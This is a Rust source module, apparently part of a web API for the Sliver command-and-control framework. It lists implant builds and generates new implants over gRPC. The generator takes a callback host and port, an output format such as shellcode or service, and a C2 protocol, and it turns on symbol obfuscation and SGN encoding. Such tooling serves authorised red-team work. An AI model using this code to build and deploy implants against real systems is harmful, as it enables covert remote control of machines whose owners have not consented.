use serde::{Deserialize, Serialize};
use uuid::Uuid;

use crate::sliver::connection::SliverConnection;
use crate::sliver::proto::{clientpb, commonpb};

/// A simplified implant build representation for API responses.
#[derive(Debug, Clone, Serialize)]
pub struct ImplantBuildResponse {
    pub name: String,
    pub is_beacon: bool,
    pub goos: String,
    pub goarch: String,
    pub debug: bool,
    pub format: i32,
    pub template_name: String,
    pub include_mtls: bool,
    pub include_http: bool,
    pub include_wg: bool,
    pub include_dns: bool,
    pub beacon_interval: i64,
    pub beacon_jitter: i64,
    pub is_staged: bool,
}

/// Fetch all implant builds from the Sliver server.
pub async fn list_builds(
    conn: &mut SliverConnection,
) -> Result<Vec<ImplantBuildResponse>, String> {
    let response = conn
        .client
        .implant_builds(tonic::Request::new(commonpb::Empty {}))
        .await
        .map_err(|e| format!("implant_builds failed: {e}"))?;

    let builds = response.into_inner();

    Ok(builds
        .configs
        .into_iter()
        .map(|(name, config)| {
            let is_staged = builds.staged.get(&name).copied().unwrap_or(false);
            ImplantBuildResponse {
                name,
                is_beacon: config.is_beacon,
                goos: config.goos,
                goarch: config.goarch,
                debug: config.debug,
                format: config.format,
                template_name: config.template_name,
                include_mtls: config.include_mtls,
                include_http: config.include_http,
                include_wg: config.include_wg,
                include_dns: config.include_dns,
                beacon_interval: config.beacon_interval,
                beacon_jitter: config.beacon_jitter,
                is_staged,
            }
        })
        .collect())
}

#[derive(Deserialize)]
pub struct GeneratePayloadRequest {
    pub name: String,
    pub goos: String,
    pub goarch: String,
    pub format: String,       // "exe" | "shared" | "shellcode" | "service"
    pub is_beacon: bool,
    pub protocol: String,     // "mtls" | "http" | "https" | "dns"
    pub lhost: String,
    pub lport: u16,
}

#[derive(Serialize)]
pub struct GenerateResponse {
    pub success: bool,
    pub message: String,
    pub implant_name: Option<String>,
}

/// Generate an implant via the Sliver gRPC `Generate` RPC.
pub async fn generate_implant(
    conn: &mut SliverConnection,
    req: GeneratePayloadRequest,
) -> GenerateResponse {
    let format = match req.format.as_str() {
        "shared" => clientpb::OutputFormat::SharedLib,
        "shellcode" => clientpb::OutputFormat::Shellcode,
        "service" => clientpb::OutputFormat::Service,
        _ => clientpb::OutputFormat::Executable,
    };

    let c2_url = format!("{}://{}:{}", req.protocol, req.lhost, req.lport);
    let config_id = uuid::Uuid::new_v4().to_string();

    let generate_req = clientpb::GenerateReq {
        name: req.name.clone(),
        config: Some(clientpb::ImplantConfig {
            id: config_id.clone(),
            goos: req.goos,
            goarch: req.goarch,
            format: format.into(),
            is_beacon: req.is_beacon,
            debug: false,
            evasion: false,
            obfuscate_symbols: true,
            sgn_enabled: true,
            is_shared_lib: format == clientpb::OutputFormat::SharedLib,
            is_service: format == clientpb::OutputFormat::Service,
            is_shellcode: format == clientpb::OutputFormat::Shellcode,
            include_http: req.protocol.starts_with("http"),
            include_mtls: req.protocol == "mtls",
            include_dns: req.protocol == "dns",
            c2: vec![clientpb::ImplantC2 {
                url: c2_url,
                priority: 1,
                ..Default::default()
            }],
            reconnect_interval: 60,
            max_connection_errors: 100,
            poll_timeout: 3600, // 1h
            beacon_interval: 30,
            beacon_jitter: 10,
            ..Default::default()
        }),
    };

    match conn
        .client
        .generate(tonic::Request::new(generate_req))
        .await
    {
        Ok(response) => {
            let out = response.into_inner();
            tracing::info!("Payload generated: {} (build_id: {})", out.implant_name, out.implant_build_id);
            GenerateResponse {
                success: true,
                message: format!("Payload '{}' generated", out.implant_name),
                implant_name: Some(out.implant_name),
            }
        }
        Err(e) => {
            tracing::error!("Generate failed: {}", e);
            GenerateResponse {
                success: false,
                message: format!("Generate failed: {}", e),
                implant_name: None,
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_response_struct() {
        let r = ImplantBuildResponse {
            name: "test".into(),
            is_beacon: true,
            goos: "linux".into(),
            goarch: "amd64".into(),
            debug: false,
            format: 0,
            template_name: "".into(),
            include_mtls: true,
            include_http: false,
            include_wg: false,
            include_dns: false,
            beacon_interval: 60,
            beacon_jitter: 30,
            is_staged: false,
        };
        assert_eq!(r.name, "test");
        assert!(r.is_beacon);
        assert_eq!(r.goos, "linux");
        assert_eq!(r.goarch, "amd64");
        assert_eq!(r.format, 0);
        assert_eq!(r.beacon_interval, 60);
    }
}
